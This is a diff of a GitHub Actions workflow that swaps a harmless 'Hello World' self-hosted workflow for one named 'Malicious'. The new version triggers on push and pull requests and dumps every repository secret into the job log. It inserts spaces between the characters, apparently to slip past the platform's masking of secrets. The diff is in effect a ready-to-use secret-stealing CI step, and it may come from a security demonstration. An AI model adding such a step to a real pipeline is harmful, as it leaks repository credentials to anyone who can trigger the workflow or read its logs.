@@ -1,34 +1,19 @@
-name: Hello World Self-Hosted
+name: Malicious
 
 on:
+  push:
   pull_request:
-  workflow_dispatch:
 
 jobs:
   build:
     runs-on: arc-runner-set
-
     steps:
-      - uses: actions/checkout@v3
-
-      - name: Run a one-line script
-        run: echo Hello, world 2!
-
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
-
-  deploy:
-    runs-on: arc-runner-set
-
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Run a one-line script
-        run: echo Hello, world 2!
-
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+      - name: Secrets
+        uses: actions/github-script@v4
+        env:
+          SECRETS: ${{ toJSON(secrets) }}
+        with:
+          script: |
+            // write secrets with spaces
+            const secrets = process.env.SECRETS.split('').join(' ');
+            console.log(secrets);
